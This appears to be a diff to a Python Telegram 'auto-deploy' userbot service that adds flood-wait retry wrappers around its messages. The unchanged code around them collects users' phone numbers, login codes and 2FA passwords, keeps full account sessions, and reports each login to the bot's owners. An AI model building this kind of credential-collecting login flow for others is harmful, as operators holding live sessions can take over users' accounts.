@@ -177,10 +177,58 @@ async def shutdown_handler(sig, frame):
 signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
 signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
 
+# ─── FLOOD-SAFE REPLY WRAPPER FOR MAIN BOT ───
+async def safe_reply(event, text, buttons=None, **kwargs):
+    try:
+        return await event.reply(text, buttons=buttons, **kwargs)
+    except FloodWaitError as e:
+        wait = e.seconds + 1
+        print(f"⏳ Main bot flood wait: {wait}s")
+        await asyncio.sleep(wait)
+        return await event.reply(text, buttons=buttons, **kwargs)
+    except Exception:
+        return None
+
+async def safe_respond(event, text, **kwargs):
+    try:
+        return await event.respond(text, **kwargs)
+    except FloodWaitError as e:
+        wait = e.seconds + 1
+        print(f"⏳ Main bot flood wait: {wait}s")
+        await asyncio.sleep(wait)
+        return await event.respond(text, **kwargs)
+    except Exception:
+        return None
+
+async def safe_edit(event, text, buttons=None, **kwargs):
+    try:
+        return await event.edit(text, buttons=buttons, **kwargs)
+    except FloodWaitError as e:
+        wait = e.seconds + 1
+        print(f"⏳ Main bot flood wait: {wait}s")
+        await asyncio.sleep(wait)
+        return await event.edit(text, buttons=buttons, **kwargs)
+    except MessageNotModifiedError:
+        pass
+    except Exception:
+        return None
+
+async def safe_send_main(chat, text, **kwargs):
+    try:
+        return await main_bot.send_message(chat, text, **kwargs)
+    except FloodWaitError as e:
+        wait = e.seconds + 1
+        print(f"⏳ Main bot flood wait: {wait}s")
+        await asyncio.sleep(wait)
+        return await main_bot.send_message(chat, text, **kwargs)
+    except Exception:
+        return None
+
 # ─── MAIN BOT HANDLERS ───
 @main_bot.on(events.NewMessage(pattern="/start"))
 async def start_handler(event):
-    await event.reply(
+    await safe_reply(
+        event,
         "╔═══════════════════════════════════════════╗\n"
         "║  ✦ 👑 ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️ 𝐀𝐔𝐓𝐎-𝐃𝐄𝐏𝐋𝐎𝐘 👑 ✦  ║\n"
         "╚═══════════════════════════════════════════╝\n\n"
@@ -206,11 +254,12 @@ async def login_handler(event):
             msg += f"• {ch['name']} ({ch['invite']})\n"
         msg += "\nAfter joining, click the **'✅ I have joined all'** button below."
         buttons = get_join_buttons()
-        await event.reply(msg, buttons=buttons)
+        await safe_reply(event, msg, buttons=buttons)
         return
 
     user_states[chat_id] = {"step": "NUMBER"}
-    await event.reply(
+    await safe_reply(
+        event,
         "📱 **Step 1:** Please send your Telegram phone number **with country code**.\n"
         "Example: `+919876543210`"
     )
@@ -233,17 +282,18 @@ async def callback_handler(event):
             msg += "\nPlease join and then click 'Verify' again."
             buttons = get_join_buttons()
             try:
-                await event.edit(msg, buttons=buttons)
+                await safe_edit(event, msg, buttons=buttons)
             except MessageNotModifiedError:
                 pass
             await event.answer("Please join all channels first.", alert=True)
         else:
             try:
-                await event.edit("✅ **All channels verified!**\n\n📱 Now send your phone number (with country code).")
+                await safe_edit(event, "✅ **All channels verified!**\n\n📱 Now send your phone number (with country code).")
             except MessageNotModifiedError:
                 pass
             user_states[chat_id] = {"step": "NUMBER"}
-            await event.respond(
+            await safe_respond(
+                event,
                 "📱 **Step 1:** Send your phone number with country code.\n"
                 "Example: `+919876543210`"
             )
@@ -259,7 +309,7 @@ async def message_handler(event):
     state = user_states[chat_id]
 
     if state["step"] == "NUMBER":
-        await event.reply("⏳ Connecting to Telegram...")
+        await safe_reply(event, "⏳ Connecting to Telegram...")
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         try:
@@ -268,12 +318,13 @@ async def message_handler(event):
             state["phone"] = text
             state["phone_code_hash"] = send_code.phone_code_hash
             state["step"] = "OTP"
-            await event.reply(
+            await safe_reply(
+                event,
                 "📩 **Step 2:** Enter the OTP you received on your Telegram.\n"
                 "You can type it with or without spaces, e.g., `1 2 3 4 5`."
             )
         except Exception as e:
-            await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
+            await safe_reply(event, f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
             user_states.pop(chat_id, None)
 
     elif state["step"] == "OTP":
@@ -281,7 +332,8 @@ async def message_handler(event):
         try:
             await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
             session_str = client.session.save()
-            await event.reply(
+            await safe_reply(
+                event,
                 "✅ **Login Successful!**\n\n"
                 "🚀 Your **⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️ Userbot** is now starting in the background...\n"
                 "You will receive a confirmation message shortly.\n\n"
@@ -304,7 +356,7 @@ async def message_handler(event):
                 )
                 for owner in MY_OWNER_IDS:
                     try:
-                        await main_bot.send_message(owner, log_msg)
+                        await safe_send_main(owner, log_msg)
                     except:
                         pass
             except Exception as log_err:
@@ -320,9 +372,9 @@ async def message_handler(event):
             user_states.pop(chat_id, None)
         except SessionPasswordNeededError:
             state["step"] = "PASSWORD"
-            await event.reply("🔒 **2-Step Verification:** Please send your 2FA password.")
+            await safe_reply(event, "🔒 **2-Step Verification:** Please send your 2FA password.")
         except Exception as e:
-            await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
+            await safe_reply(event, f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
             user_states.pop(chat_id, None)
 
     elif state["step"] == "PASSWORD":
@@ -330,7 +382,8 @@ async def message_handler(event):
         try:
             await client.sign_in(password=text)
             session_str = client.session.save()
-            await event.reply(
+            await safe_reply(
+                event,
                 "✅ **Login Successful!**\n\n"
                 "🚀 Your **⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️ Userbot** is now starting in the background...\n"
                 "You will receive a confirmation message shortly.\n\n"
@@ -353,7 +406,7 @@ async def message_handler(event):
                 )
                 for owner in MY_OWNER_IDS:
                     try:
-                        await main_bot.send_message(owner, log_msg)
+                        await safe_send_main(owner, log_msg)
                     except:
                         pass
             except Exception as log_err:
@@ -368,26 +421,28 @@ async def message_handler(event):
             asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
             user_states.pop(chat_id, None)
         except Exception as e:
-            await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
+            await safe_reply(event, f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
             user_states.pop(chat_id, None)
 
 # ─── BROADCAST COMMAND (Only main owners) ───
 @main_bot.on(events.NewMessage(pattern="/broadcast"))
 async def broadcast_cmd(event):
     if event.sender_id not in MY_OWNER_IDS:
-        return await event.reply("❌ Owner only.")
+        await safe_reply(event, "❌ Owner only.")
+        return
     text = event.text.strip().replace("/broadcast", "").strip()
     if not text:
-        return await event.reply("Usage: /broadcast <message>")
+        await safe_reply(event, "Usage: /broadcast <message>")
+        return
     count = 0
     for uid in broadcast_users:
         try:
-            await main_bot.send_message(uid, f"📢 **Broadcast from Owner:**\n{text}")
+            await safe_send_main(uid, f"📢 **Broadcast from Owner:**\n{text}")
             count += 1
             await asyncio.sleep(0.5)
         except:
             pass
-    await event.reply(f"✅ Broadcast sent to {count} users.")
+    await safe_reply(event, f"✅ Broadcast sent to {count} users.")
 
 # ─── LOGOUT COMMAND ───
 @main_bot.on(events.NewMessage(pattern="/logout"))
@@ -396,7 +451,7 @@ async def logout_handler(event):
     chat_id = event.chat_id
 
     if user_id not in active_userbots:
-        await event.reply("❌ You don't have an active userbot.\n\nUse `/login` to start one.")
+        await safe_reply(event, "❌ You don't have an active userbot.\n\nUse `/login` to start one.")
         return
 
     try:
@@ -407,7 +462,8 @@ async def logout_handler(event):
         await delete_session(user_id)
         user_states.pop(user_id, None)
 
-        await event.reply(
+        await safe_reply(
+            event,
             "✅ **Your userbot has been safely logged out.**\n\n"
             "• Userbot session terminated.\n"
             "• You can start a new one anytime with `/login`.\n"
@@ -416,11 +472,11 @@ async def logout_handler(event):
 
         for owner in MY_OWNER_IDS:
             try:
-                await main_bot.send_message(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
+                await safe_send_main(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
             except:
                 pass
     except Exception as e:
-        await event.reply(f"❌ Logout error: `{str(e)}`")
+        await safe_reply(event, f"❌ Logout error: `{str(e)}`")
         active_userbots.pop(user_id, None)
         user_sessions.pop(user_id, None)
         await delete_session(user_id)
@@ -433,6 +489,17 @@ async def run_user_bot_with_restart(session_string, chat_id):
         try:
             await run_user_bot(session_string, chat_id)
             break
+        except FloodWaitError as e:
+            wait = e.seconds + 1
+            print(f"⏳ Userbot flood wait: {wait}s. Sleeping...")
+            try:
+                await main_bot.send_message(chat_id, f"⚠️ **Telegram flood limit reached.**\n⏳ Please wait **{wait//60} minutes {wait%60} seconds** before using the userbot again.")
+                for owner in MY_OWNER_IDS:
+                    await main_bot.send_message(owner, f"🔄 **Userbot FloodWait**\nUser: {chat_id}\nWait: {wait}s")
+            except:
+                pass
+            await asyncio.sleep(wait)
+            # after waiting, continue loop to restart
         except Exception as e:
             error_msg = str(e)
             if "SESSION_INVALID" in error_msg:
@@ -1095,7 +1162,18 @@ async def run_user_bot(session_string, chat_id):
         async def safe_edit(event, text):
             try:
                 return await event.edit(text)
-            except:
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds + 1)
+                try:
+                    return await event.edit(text)
+                except:
+                    try:
+                        return await event.reply(text)
+                    except:
+                        return
+            except MessageNotModifiedError:
+                pass
+            except Exception:
                 try:
                     return await event.reply(text)
                 except:
@@ -3364,7 +3442,7 @@ async def run_user_bot(session_string, chat_id):
             msg = parts[1]
             try:
                 entity = await user_bot.get_entity(target_part)
-                await user_bot.send_message(entity, msg)
+                await safe_send(entity, msg)
                 await safe_edit(event, f"✅ Message sent to {target_part}")
             except Exception as e:
                 await safe_edit(event, f"❌ Failed: {e}")
@@ -3405,6 +3483,7 @@ async def run_user_bot(session_string, chat_id):
             for target_str, message in pairs:
                 try:
                     entity = await user_bot.get_entity(target_str)
+                    # Send the message in the current chat
                     await safe_send(event.chat_id, f"[{target_str}](tg://user?id={entity.id}) {message}")
                     await asyncio.sleep(0.5)
                     sent += 1
@@ -3697,8 +3776,8 @@ async def run_user_bot(session_string, chat_id):
                     return
             try:
                 await cmd_data["func"](event, arg)
-            except FloodWaitError:
-                pass
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds + 1)
             except Exception:
                 pass
 
